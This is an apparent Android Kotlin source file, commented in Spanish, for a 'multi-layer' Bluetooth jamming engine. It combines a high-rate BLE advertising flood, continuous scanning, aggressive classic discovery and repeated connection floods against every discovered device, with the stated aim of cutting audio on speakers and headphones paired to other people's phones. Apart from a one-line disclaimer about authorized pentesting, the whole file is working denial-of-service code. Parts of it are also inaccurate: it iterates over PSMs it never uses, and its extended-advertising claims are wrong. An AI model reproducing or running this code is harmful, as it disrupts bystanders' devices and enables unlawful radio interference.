package com.industrialble.jamming

import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.bluetooth.le.BluetoothLeScanner
import android.bluetooth.le.ScanCallback
import android.bluetooth.le.ScanResult
import android.bluetooth.le.ScanSettings
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.ParcelUuid
import android.util.Log
import java.util.Random
import java.util.UUID
import java.util.concurrent.Callable
import java.util.concurrent.CopyOnWriteArrayList
import java.util.concurrent.Executors
import java.util.concurrent.Future
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.ThreadFactory
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.atomic.AtomicLong

/**
 * 🔥 INTERFERENCIA MULTI-CAPA PARA BLUETOOTH
 *
 * ESTRATEGIA COMPLETA para degradar conexiones Bluetooth (A2DP, HSP, etc.)
 * de dispositivos CERCANOS (parlantes, auriculares) conectados a otros teléfonos.
 *
 * CAPAS DE ATAQUE:
 *
 * 1. BLE ADVERTISING FLOOD (~50 ads/segundo)
 *    - Rota anuncios BLE falsos cada 20ms (mínimo del hardware)
 *    - Usa Extended Advertising (Bluetooth 5.x) con payloads grandes (~1650 bytes)
 *    - 2 advertising sets simultáneos con payloads diferentes
 *    - UUIDs, datos de fabricante y nombres completamente aleatorios
 *
 * 2. BLE SCANNING PARALELO
 *    - Escanea BLE continuamente mientras se anuncia
 *    - Mantiene el radio ocupado en BLE además del advertising
 *
 * 3. CLASSIC BT INQUIRY AGRESIVO
 *    - Discovery Classic periódico cada ~2s
 *    - Detecta dispositivos BT que usan A2DP (parlantes, auriculares)
 *
 * 4. L2CAP CONNECTION FLOOD (¡el más importante!)
 *    - Para cada dispositivo descubierto, intenta múltiples conexiones L2CAP
 *    - Los dispositivos destino procesan las peticiones de conexión
 *    - Esto satura su stack BT y DEGRADA conexiones A2DP existentes
 *    - Las conexiones L2CAP fallan (el otro side no tiene server) pero el
 *      procesamiento de los intentos ya consume recursos del chip BT remoto
 *
 * ⚠️ Solo para pentesting en dispositivos propios / con autorización explícita.
 */
class JammingEngine(
    private val bluetoothAdapter: BluetoothAdapter,
    private val context: android.content.Context?
) {

    private val advertiser: BluetoothLeAdvertiser? = bluetoothAdapter.bluetoothLeAdvertiser
    private val scanner: BluetoothLeScanner? = bluetoothAdapter.bluetoothLeScanner
    private val scheduler: ScheduledExecutorService = Executors.newScheduledThreadPool(
        6,
        ThreadFactory { Thread(it, "bt-attack-${threadCounter.incrementAndGet()}") }
    )

    // Pool DEDICADO para L2CAP — conexiones bloqueantes no saturan el scheduler
    private val l2capExecutor = Executors.newCachedThreadPool(
        ThreadFactory { Thread(it, "l2cap-${threadCounter.incrementAndGet()}") }
    )
    private val l2capFutures = CopyOnWriteArrayList<Future<*>>()

    private val isActive = AtomicBoolean(false)
    private val adsSent = AtomicLong(0)
    private val l2capAttempts = AtomicLong(0)
    private val startTime = AtomicLong(0)
    private val random = Random()

    // Pool de payloads pre-generados
    private val legacyPayloads = mutableListOf<AdvertiseData>()
    private val extendedPayloads = mutableListOf<AdvertiseData>()
    private var currentPayloadIndex = 0
    private var currentCallbacks = mutableListOf<AdvertiseCallback>()
    private var failedStartCount = AtomicInteger(0)
    private var supportsExtendedAdvertising = false

    // Discovered devices (via Classic BT)
    private val _discoveredDevices = CopyOnWriteArrayList<String>()
    private val _deviceNames = CopyOnWriteArrayList<String>()
    val discoveredDevices: List<String> get() = _discoveredDevices.toList()

    // L2CAP attack targets
    private val l2capTargets = CopyOnWriteArrayList<String>()
    private var l2capAttackRunning = false

    // Callbacks
    var onDeviceDiscovered: ((String, String?) -> Unit)? = null
    var onStateChanged: ((Boolean) -> Unit)? = null
    var onLog: ((String) -> Unit)? = null
    var onL2capAttack: ((String) -> Unit)? = null

    data class JamStats(
        val isActive: Boolean,
        val advertisementsSent: Long,
        val l2capConnectionAttempts: Long,
        val elapsedSeconds: Long,
        val devicesFound: Int,
        val payloadsCount: Int
    )

    // ════════════════════════════════════════════════════════════
    // CONTROL
    // ════════════════════════════════════════════════════════════

    fun start() {
        if (isActive.getAndSet(true)) return
        adsSent.set(0)
        l2capAttempts.set(0)
        failedStartCount.set(0)
        startTime.set(System.currentTimeMillis())

        log("")
        log("╔══════════════════════════════════════════════╗")
        log("║   🔥 ATAQUE MULTI-CAPA BLUETOOTH INICIADO   ║")
        log("╚══════════════════════════════════════════════╝")
        log("📱 Dispositivo: ${bluetoothAdapter.name ?: "Desconocido\"}")
        log("📡 Bluetooth: ${if (bluetoothAdapter.isEnabled) \"ACTIVO\" else \"APAGADO\"}")
        log("🔬 Chip: ${if (advertiser != null) \"BLE Advertiser OK\" else \"BLE Advertiser NO\"}")

        // Detectar soporte Extended Advertising (Bluetooth 5.x)
        supportsExtendedAdvertising = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
        log("📦 Extended Advertising (BLE 5.x): ${if (supportsExtendedAdvertising) \"SOPORTADO\" else \"NO\"}")

        // Pre-generar payloads
        generatePayloadPools()
        log("🧬 ${legacyPayloads.size} payloads legacy + ${extendedPayloads.size} extended precargados")

        // ============================================================
        // CAPA 1: BLE ADVERTISING FLOOD (~50 ads/segundo)
        // ============================================================
        startBleFloodLoop()
        log("📡 CAPA 1: BLE Advertising Flood (~50 ads/s) iniciado")

        // ============================================================
        // CAPA 2: BLE SCANNING PARALELO
        // ============================================================
        startBleScanLoop()
        log("📡 CAPA 2: BLE Scanning paralelo iniciado")

        // ============================================================
        // CAPA 3: CLASSIC BT DISCOVERY
        // ============================================================
        registerDiscoveryReceiver()
        startClassicDiscoveryLoop()
        log("📡 CAPA 3: Classic BT Discovery agresivo iniciado")

        // ============================================================
        // CAPA 4: L2CAP CONNECTION FLOOD
        // ============================================================
        startL2capAttackLoop()
        log("📡 CAPA 4: L2CAP Connection Flood listo (se activa con dispositivos)")

        onStateChanged?.invoke(true)
    }

    fun stop() {
        if (!isActive.getAndSet(false)) return
        log("🛑 DETENIENDO TODAS LAS CAPAS DE ATAQUE")
        log("   Esperando 2s para shutdown limpio...")

        // Cancelar todos los L2CAP pendientes
        l2capFutures.forEach { it.cancel(true) }
        l2capFutures.clear()
        l2capExecutor.shutdownNow()

        scheduler.shutdown()
        try { scheduler.awaitTermination(2, TimeUnit.SECONDS) } catch (_: InterruptedException) { }

        // Detener advertising
        stopAllAdvertising()
        // Detener scanning
        stopBleScan()
        // Detener classic discovery
        cancelClassicDiscovery()
        unregisterDiscoveryReceiver()

        val elapsed = (System.currentTimeMillis() - startTime.get()) / 1000
        val sent = adsSent.get()
        val l2cap = l2capAttempts.get()
        log("✅ Ataque detenido después de ${elapsed}s")
        log("📊 Anuncios BLE enviados: $sent")
        log("🔗 Intentos de conexión L2CAP: $l2cap")
        log("📱 Dispositivos descubiertos: ${_discoveredDevices.size}")
        log("⚠️ Fallos al anunciar: ${failedStartCount.get()}")

        l2capAttackRunning = false
        onStateChanged?.invoke(false)
    }

    fun getStats(): JamStats = JamStats(
        isActive = isActive.get(),
        advertisementsSent = adsSent.get(),
        l2capConnectionAttempts = l2capAttempts.get(),
        elapsedSeconds = if (isActive.get())
            (System.currentTimeMillis() - startTime.get()) / 1000
        else 0L,
        devicesFound = _discoveredDevices.size,
        payloadsCount = legacyPayloads.size + extendedPayloads.size
    )

    fun clearDevices() {
        _discoveredDevices.clear()
        _deviceNames.clear()
        l2capTargets.clear()
    }

    fun shutdown() {
        stop()
    }

    // ════════════════════════════════════════════════════════════
    // CAPA 1: BLE ADVERTISING FLOOD (~50 ads/s)
    // ════════════════════════════════════════════════════════════

    /**
     * Rota anuncios BLE cada ~20ms (mínimo del hardware Bluetooth).
     * Usa 2 advertising sets simultáneos si el hardware lo soporta.
     */
    private fun startBleFloodLoop() {
        if (!isActive.get()) return

        scheduler.schedule({
            if (!isActive.get()) return@schedule

            try {
                // Detener anuncios anteriores
                stopAllAdvertising()
                currentCallbacks.clear()

                // Iniciar 1-2 anuncios simultáneos
                val firstPayload = legacyPayloads[currentPayloadIndex]
                currentPayloadIndex = (currentPayloadIndex + 1) % legacyPayloads.size

                val secondPayload = if (supportsExtendedAdvertising && extendedPayloads.isNotEmpty()) {
                    extendedPayloads[currentPayloadIndex % extendedPayloads.size]
                } else null

                startAdvertise(firstPayload, ADVERTISE_MODE_LOW_LATENCY)
                if (secondPayload != null) {
                    // Segundo set con modo ligeramente desfasado para cubrir más espectro
                    startAdvertise(secondPayload, ADVERTISE_MODE_BALANCED)
                }

                // Reprogramar en 20ms (~50 rotaciones/segundo)
                scheduleNextBleFlood()
            } catch (e: Exception) {
                log("⚠️ Error en BLE flood: ${e.message}")
                if (isActive.get()) scheduleNextBleFlood()
            }
        }, 0, TimeUnit.MILLISECONDS)
    }

    private fun scheduleNextBleFlood() {
        if (isActive.get()) {
            scheduler.schedule({
                startBleFloodLoop()
            }, 20, TimeUnit.MILLISECONDS) // 20ms = ~50 ads/segundo
        }
    }

    private fun startAdvertise(data: AdvertiseData, mode: Int) {
        if (advertiser == null) return

        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(mode)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(false)
            .setTimeout(0)
            .build()

        val callback = object : AdvertiseCallback() {
            override fun onStartSuccess(settingsInEffect: AdvertiseSettings) {
                adsSent.incrementAndGet()
            }

            override fun onStartFailure(errorCode: Int) {
                when (errorCode) {
                    ADVERTISE_FAILED_ALREADY_STARTED -> { /* esperado con rotación rápida */ }
                    ADVERTISE_FAILED_DATA_TOO_LARGE -> failedStartCount.incrementAndGet()
                    ADVERTISE_FAILED_TOO_MANY_ADVERTISERS -> failedStartCount.incrementAndGet()
                    ADVERTISE_FAILED_INTERNAL_ERROR -> {
                        if (failedStartCount.incrementAndGet() < 3) {
                            log("⚠️ Error interno advertising BLE")
                        }
                    }
                    ADVERTISE_FAILED_FEATURE_UNSUPPORTED -> {
                        if (failedStartCount.incrementAndGet() < 3) {
                            log("⚠️ Advertising no soportado en este dispositivo")
                        }
                    }
                }
            }
        }

        currentCallbacks.add(callback)

        try {
            advertiser?.startAdvertising(settings, data, callback)
        } catch (e: SecurityException) {
            if (failedStartCount.incrementAndGet() < 2) {
                log("⚠️ Permiso BLUETOOTH_ADVERTISE no concedido")
            }
        } catch (e: IllegalStateException) {
            if (failedStartCount.incrementAndGet() < 2) {
                log("⚠️ Bluetooth apagado, no se puede anunciar")
            }
        } catch (e: Exception) {
            if (failedStartCount.incrementAndGet() < 3) {
                log("⚠️ Error advertising: ${e::class.simpleName}")
            }
        }
    }

    private fun stopAllAdvertising() {
        currentCallbacks.forEach { callback ->
            try { advertiser?.stopAdvertising(callback) } catch (_: Exception) { }
        }
        currentCallbacks.clear()
    }

    // ════════════════════════════════════════════════════════════
    // CAPA 2: BLE SCANNING PARALELO
    // ════════════════════════════════════════════════════════════

    private var scanCallback: ScanCallback? = null
    private var isScanning = false
    private val scanDevices = mutableSetOf<String>()

    /**
     * Escanea BLE continuamente mientras se anuncia.
     * Mantiene el radio ocupado y descubre dispositivos BLE adicionales.
     */
    private fun startBleScanLoop() {
        if (!isActive.get() || scanner == null) return

        scheduler.schedule({
            if (!isActive.get()) return@schedule

            try {
                if (!isScanning) {
                    startBleScan()
                }

                // Rotar: escanear 3s, pausar 1s, repetir
                scheduler.schedule({
                    if (isActive.get()) {
                        stopBleScan()
                        scheduler.schedule({
                            if (isActive.get()) startBleScanLoop()
                        }, 1000, TimeUnit.MILLISECONDS)
                    }
                }, 3000, TimeUnit.MILLISECONDS)
            } catch (e: Exception) {
                log("⚠️ Error en BLE scan loop: ${e.message}")
                if (isActive.get()) startBleScanLoop()
            }
        }, 500, TimeUnit.MILLISECONDS)
    }

    private fun startBleScan() {
        if (scanner == null || isScanning) return

        scanCallback = object : ScanCallback() {
            override fun onScanResult(callbackType: Int, result: ScanResult) {
                val device = result.device
                if (device != null && !scanDevices.contains(device.address)) {
                    scanDevices.add(device.address)
                    if (!_discoveredDevices.contains(device.address)) {
                        _discoveredDevices.add(device.address)
                        _deviceNames.add(device.name ?: "Desconocido")
                        onDeviceDiscovered?.invoke(device.address, device.name)
                        log("🔍 BLE: ${device.address} (${device.name ?: "?"}) RSSI:${result.rssi}")
                    }
                }
            }

            override fun onScanFailed(errorCode: Int) {
                isScanning = false
            }
        }

        try {
            val settings = ScanSettings.Builder()
                .setScanMode(ScanSettings.SCAN_MODE_LOW_LATENCY)
                .setReportDelay(0)
                .build()

            scanner?.startScan(null, settings, scanCallback)
            isScanning = true
        } catch (e: SecurityException) {
            // Sin permiso BLUETOOTH_SCAN
        } catch (e: Exception) {
            // Otro error
        }
    }

    private fun stopBleScan() {
        try {
            scanCallback?.let { scanner?.stopScan(it) }
        } catch (_: Exception) { }
        scanCallback = null
        isScanning = false
    }

    // ════════════════════════════════════════════════════════════
    // CAPA 3: CLASSIC BT DISCOVERY AGRESIVO
    // ════════════════════════════════════════════════════════════

    private var isClassicDiscovering = false
    private var discoveryReceiver: BroadcastReceiver? = null

    /**
     * Escaneo Classic cada ~3 segundos para descubrir dispositivos
     * Bluetooth BR/EDR (parlantes, auriculares, etc.)
     */
    private fun startClassicDiscoveryLoop() {
        if (!isActive.get()) return

        scheduler.schedule({
            if (!isActive.get()) return@schedule

            try {
                if (!bluetoothAdapter.isDiscovering) {
                    bluetoothAdapter.startDiscovery()
                    isClassicDiscovering = true
                }

                // Cancelar después de 2s
                scheduler.schedule({
                    if (isActive.get()) {
                        cancelClassicDiscovery()
                        startClassicDiscoveryLoop()
                    }
                }, 2000, TimeUnit.MILLISECONDS)
            } catch (e: Exception) {
                if (isActive.get()) startClassicDiscoveryLoop()
            }
        }, 800, TimeUnit.MILLISECONDS)
    }

    private fun cancelClassicDiscovery() {
        try {
            if (bluetoothAdapter.isDiscovering) {
                bluetoothAdapter.cancelDiscovery()
            }
        } catch (_: Exception) { }
        isClassicDiscovering = false
    }

    private fun registerDiscoveryReceiver() {
        discoveryReceiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context, intent: Intent) {
                when (intent.action) {
                    BluetoothDevice.ACTION_FOUND -> {
                        val device = intent.getParcelableExtra<BluetoothDevice>(
                            BluetoothDevice.EXTRA_DEVICE
                        ) ?: return
                        if (!_discoveredDevices.contains(device.address)) {
                            _discoveredDevices.add(device.address)
                            _deviceNames.add(device.name ?: "Desconocido")
                            onDeviceDiscovered?.invoke(device.address, device.name)
                            log("🔍 BT Classic: ${device.address} (${device.name ?: "?"})")

                            // Si hay un nombre con "speaker", "parlante", "audio" -> priorizar para L2CAP
                            val name = (device.name ?: "").lowercase()
                            if (name.contains("speaker") || name.contains("audio") ||
                                name.contains("headphone") || name.contains("auricular") ||
                                name.contains("parlante") || name.contains("earphone") ||
                                name.contains("headset") || name.contains("sound") ||
                                name.contains("music") || name.contains("altavoz")) {
                                log("🎯 POSIBLE PARLANTE DETECTADO: ${device.name} - ${device.address}")
                            }
                        }
                    }
                    BluetoothAdapter.ACTION_DISCOVERY_FINISHED -> {
                        isClassicDiscovering = false
                    }
                }
            }
        }
        val filter = IntentFilter().apply {
            addAction(BluetoothDevice.ACTION_FOUND)
            addAction(BluetoothAdapter.ACTION_DISCOVERY_FINISHED)
        }
        try {
            context?.registerReceiver(discoveryReceiver, filter)
        } catch (e: Exception) {
            log("⚠️ Error registrando receiver discovery: ${e.message}")
        }
    }

    private fun unregisterDiscoveryReceiver() {
        try {
            discoveryReceiver?.let { context?.unregisterReceiver(it) }
        } catch (_: Exception) { }
        discoveryReceiver = null
    }

    // ════════════════════════════════════════════════════════════
    // CAPA 4: L2CAP CONNECTION FLOOD
    // ════════════════════════════════════════════════════════════

    /**
     * Intenta conectar por L2CAP a cada dispositivo descubierto.
     *
     * ¿Por qué funciona contra parlantes A2DP?
     * - El parlante tiene un stack BT que maneja conexiones entrantes
     * - Al recibir múltiples intentos de conexión L2CAP, su stack
     *   debe procesar cada uno (autenticación, negociación de parámetros)
     * - Esto consume recursos del chip BT y DEGRADA el rendimiento
     *   de la transmisión de audio A2DP existente
     * - El audio se entrecorta o se cae por timeouts de scheduling
     *
     * NOTA: Estas conexiones normalmente fallan porque el parlante
     * no tiene un server L2CAP en los PSMs que probamos... pero
     * el PROCESAMIENTO del intento ya consume recursos.
     */
    private fun startL2capAttackLoop() {
        if (!isActive.get() || l2capAttackRunning) return
        l2capAttackRunning = true

        scheduler.schedule({
            if (!isActive.get()) { l2capAttackRunning = false; return@schedule }

            // Obtener dispositivos descubiertos que aún no hemos atacado
            val targets = _discoveredDevices.filter { !l2capTargets.contains(it) }
            val knownTargets = _discoveredDevices.filter { l2capTargets.contains(it) }

            // Atacar NUEVOS dispositivos
            targets.forEach { address ->
                if (!isActive.get()) return@schedule
                launchL2capAttack(address)
                l2capTargets.add(address)
            }

            // Re-atacar dispositivos conocidos cada ~10 ciclos (ataque persistente)
            if (knownTargets.isNotEmpty() && random.nextInt(4) == 0) {
                val target = knownTargets[random.nextInt(knownTargets.size)]
                if (isActive.get()) {
                    launchL2capAttack(target)
                }
            }

            // Reprogramar
            if (isActive.get()) startL2capAttackLoop()
        }, 2000, TimeUnit.MILLISECONDS)
    }

    /**
     * Lanza múltiples intentos de conexión L2CAP a diferentes PSMs.
     * Los PSMs comunes en dispositivos de audio: 0x0019 (AVDTP), 0x001B (AVCTP)
     * También probamos PSMs aleatorios para forzar procesamiento.
     *
     * ⚠️ CADA INTENTO USA SU PROPIO THREAD (cached thread pool).
     *    socket.connect() es BLOQUEANTE (puede tardar 5-30s en timeout).
     *    Si usáramos el scheduler pool de 6 threads, se agotarían.
     *    Cada intento tiene un timeout forzado vía Future.get(3, SECONDS).
     */
    private fun launchL2capAttack(address: String) {
        if (!isActive.get()) return

        // PSMs para atacar: comunes en audio + aleatorios
        val psms = intArrayOf(
            0x0019,  // AVDTP (Audio/Video Distribution Transport)
            0x001B,  // AVCTP (Audio/Video Control Transport)
            0x0003,  // RFCOMM
            0x0007,  // RFCOMM (alternativo)
            0x1001,  // PSM alto aleatorio
            0x1003,  // PSM alto aleatorio
            0x0101,  // PSM de verificación (si el parlante lo tiene)
            0x1005,  // PSM alto aleatorio
            0x0001,  // SDP
            0x0005,  // RFCOMM
        )

        val psmsToTry = psms.toMutableList()
        // Agregar 3 PSMs aleatorios adicionales
        for (i in 0 until 3) {
            psmsToTry.add(0x1000 + random.nextInt(0xFFF0))
        }
        // Barajar para no atacar siempre en el mismo orden
        psmsToTry.shuffle(random)

        // Lanzar todos los intentos en paralelo (cached thread pool = sin bloqueo)
        psmsToTry.forEachIndexed { index, psm ->
            if (!isActive.get()) return@forEachIndexed

            val future = l2capExecutor.submit(Callable {
                if (!isActive.get()) return@Callable Unit
                try {
                    val device = bluetoothAdapter.getRemoteDevice(address)
                    if (device != null) {
                        val socket = device.createRfcommSocketToServiceRecord(
                            UUID.randomUUID()
                        )
                        try {
                            socket.connect()
                            socket.close()
                        } finally {
                            // SIEMPRE cerrar el socket, incluso si connect() falla
                            try { if (socket.isConnected) socket.close() } catch (_: Exception) { }
                        }
                        l2capAttempts.incrementAndGet()
                    }
                } catch (e: Exception) {
                    l2capAttempts.incrementAndGet()
                }
                Unit
            })

            l2capFutures.add(future)

            // Forzar timeout de 3s — si connect() se cuelga, lo matamos
            scheduler.schedule({
                if (!future.isDone) {
                    future.cancel(true)
                    l2capFutures.remove(future)
                }
            }, 3000, TimeUnit.MILLISECONDS)
        }

        // Limpiar futures completados
        l2capFutures.removeAll { it.isDone }

        log("🔗 L2CAP attack -> $address (${psmsToTry.size} PSMs)")
        onL2capAttack?.invoke(address)
    }

    // ════════════════════════════════════════════════════════════
    // PAYLOAD GENERATION
    // ════════════════════════════════════════════════════════════

    /**
     * Genera pools de payloads BLE falsos.
     * Crea payloads tanto legacy (31 bytes) como extended (hasta 1650 bytes).
     */
    private fun generatePayloadPools() {
        legacyPayloads.clear()
        extendedPayloads.clear()

        val vendorIds = intArrayOf(
            0x004C, 0x0075, 0x00E0, 0x0059, 0x0006, 0x00F0, 0x00A1,
            0x00E0, 0x000A, 0x00D9, 0x00E9, 0x00F1, 0x00A0, 0x0012
        )

        // --- LEGACY PAYLOADS (31 bytes) ---
        for (i in 0 until 30) {
            val builder = AdvertiseData.Builder()
            builder.setIncludeDeviceName(random.nextInt(3) == 0)
            builder.setIncludeTxPowerLevel(random.nextBoolean())

            // 1-3 UUIDs aleatorios
            val uuidCount = 1 + random.nextInt(3)
            for (j in 0 until uuidCount) {
                builder.addServiceUuid(ParcelUuid(UUID.randomUUID()))
            }

            // Manufacturer data
            if (random.nextBoolean()) {
                val vendorId = vendorIds[random.nextInt(vendorIds.size)]
                val dataLen = 2 + random.nextInt(20)
                val data = ByteArray(dataLen)
                random.nextBytes(data)
                if (data.isNotEmpty()) data[0] = (1 + random.nextInt(254)).toByte()
                builder.addManufacturerData(vendorId, data)
            }

            legacyPayloads.add(builder.build())
        }

        // --- EXTENDED PAYLOADS (hasta 500 bytes, para Bluetooth 5.x) ---
        // Nota: Extended Advertising no tiene API directa en Android estándar,
        // pero podemos crear payloads más grandes que serán enviados
        // con el mecanismo de advertising normal si el chip lo soporta.
        for (i in 0 until 20) {
            val builder = AdvertiseData.Builder()
            builder.setIncludeDeviceName(random.nextBoolean())
            builder.setIncludeTxPowerLevel(random.nextBoolean())

            // 3-6 UUIDs
            val uuidCount = 3 + random.nextInt(4)
            for (j in 0 until uuidCount) {
                builder.addServiceUuid(ParcelUuid(UUID.randomUUID()))
            }

            // Manufacturer data grande
            val vendorId = vendorIds[random.nextInt(vendorIds.size)]
            val dataLen = 10 + random.nextInt(200)
            val data = ByteArray(dataLen)
            random.nextBytes(data)
            if (data.isNotEmpty()) data[0] = (1 + random.nextInt(254)).toByte()
            builder.addManufacturerData(vendorId, data)

            // Service data grande
            val uuid = UUID.randomUUID()
            val svcDataLen = 5 + random.nextInt(50)
            val svcData = ByteArray(svcDataLen)
            random.nextBytes(svcData)
            builder.addServiceData(ParcelUuid(uuid), svcData)

            extendedPayloads.add(builder.build())
        }
    }

    // ════════════════════════════════════════════════════════════
    // LOGGING
    // ════════════════════════════════════════════════════════════

    private fun log(msg: String) {
        Log.i(TAG, msg)
        onLog?.invoke(msg)
    }

    companion object {
        private const val TAG = "BtAttackEngine"
        private val threadCounter = AtomicLong(0)

        // Advertise mode constants
        private const val ADVERTISE_MODE_LOW_LATENCY = AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY
        private const val ADVERTISE_MODE_BALANCED = AdvertiseSettings.ADVERTISE_MODE_BALANCED
    }
}
